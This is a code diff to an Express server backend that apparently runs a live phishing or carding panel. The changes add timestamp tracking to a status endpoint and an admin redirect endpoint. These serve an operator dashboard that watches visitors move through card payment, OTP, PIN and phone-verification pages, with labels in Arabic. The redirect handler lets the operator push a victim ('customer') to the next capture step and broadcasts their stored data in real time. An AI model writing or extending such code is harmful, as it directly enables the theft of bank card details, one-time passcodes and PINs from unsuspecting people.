@@ -834,7 +834,7 @@ async function startServer() {
     }
   });
 
-  app.post("/api/dashboard/reflect-status", (req, res) => {
+  app.post("/api/dashboard/reflect-status", async (req, res) => {
     try {
       const body = req.body || {};
       const visitorId = String(body.visitorId || body.id || "").trim();
@@ -845,6 +845,32 @@ async function startServer() {
         return;
       }
 
+      // Map field names to their corresponding timestamp fields
+      const timestampFieldMap: Record<string, string> = {
+        '_v1Status': '_v1UpdatedAt',
+        '_v5Status': '_v5UpdatedAt',
+        '_v6Status': '_v6UpdatedAt',
+        '_v7Status': '_v7UpdatedAt',
+        'phoneOtpStatus': '_v7UpdatedAt',
+        'payment': '_v1UpdatedAt',
+        'otp': '_v5UpdatedAt',
+        'pin': '_v6UpdatedAt',
+        'phone': '_v7UpdatedAt',
+      };
+
+      const timestampField = timestampFieldMap[field] || 'updatedAt';
+      const now = new Date().toISOString();
+
+      // Build update data with timestamp
+      const updateData: Record<string, any> = {
+        [field]: status,
+        [timestampField]: now,
+      };
+
+      // Update visitor in database
+      await upsertVisitor(visitorId, updateData);
+
+      // Broadcast to visitor via SSE
       broadcastToVisitor(visitorId, field, status);
       if (body.currentPage) {
         broadcastToVisitor(visitorId, "currentPage", body.currentPage);
@@ -853,7 +879,23 @@ async function startServer() {
         broadcastToVisitor(visitorId, "currentStep", body.currentStep);
       }
 
-      res.json({ success: true, field, status, visitorId });
+      // Get current visitor data for dashboard update
+      const currentVisitor = await readVisitor(visitorId);
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
+
+      // Broadcast to dashboard with updated timestamps
+      const dashboardData = await upsertDashboardRequest({
+        id: visitorId,
+        visitorId: visitorId,
+        customer: customerName,
+        ...currentVisitor,
+        ...updateData,
+        updated: `تم تحديث ${field}`
+      });
+
+      broadcastToDashboard("dashboard:update", dashboardData);
+
+      res.json({ success: true, field, status, visitorId, timestamp: now });
     } catch (error) {
       console.error("reflect-status error", error);
       res.status(500).json({ error: "Failed to reflect status" });
@@ -1653,13 +1695,26 @@ async function startServer() {
       
       const currentVisitor = await readVisitor(visitorId);
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
+      const now = new Date().toISOString();
+
+      // Map target pages to their corresponding timestamp fields
+      const pageTimestampMap: Record<string, string> = {
+        'check': '_v1UpdatedAt',      // Card payment page
+        'step2': '_v5UpdatedAt',      // OTP page
+        'step3': '_v6UpdatedAt',       // PIN page
+        'step4': '_v7UpdatedAt',       // Phone page
+        'step5': '_v7UpdatedAt',       // Phone page
+      };
+
+      const timestampField = pageTimestampMap[targetPage] || 'updatedAt';
 
       // Clear ALL previous statuses and set one-time redirect
       const updateData: Record<string, any> = {
         adminRedirectPage: targetPage,
-        adminRedirectAt: new Date().toISOString(),
+        adminRedirectAt: now,
         oneTimeRedirect: targetPage, // One-time redirect flag
         currentPage: targetPage,
+        [timestampField]: now, // Update the timestamp for this specific box
         // Clear all previous statuses
         phoneOtpStatus: null,
         phoneRejectionMessage: null,
@@ -1681,7 +1736,7 @@ async function startServer() {
       console.log("[Dashboard Redirect] Saving updateData:", updateData);
       await upsertVisitor(visitorId, updateData);
 
-      // Preserve all existing visitor data for dashboard
+      // Preserve all existing visitor data for dashboard with updated timestamps
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
         visitorId: visitorId,
@@ -1691,11 +1746,11 @@ async function startServer() {
         // Override with new update data
         ...updateData, 
         updated: `تم التوجيه إلى: ${targetPage}` 
-      }, { preserveTimestamp: true });
+      });
 
       broadcastToDashboard("dashboard:update", dashboardData);
 
-      res.json({ success: true, redirected: true, targetPage });
+      res.json({ success: true, redirected: true, targetPage, timestamp: now });
     } catch (error) {
       console.error("redirect error", error);
       res.status(500).json({ error: "Failed to redirect customer" });
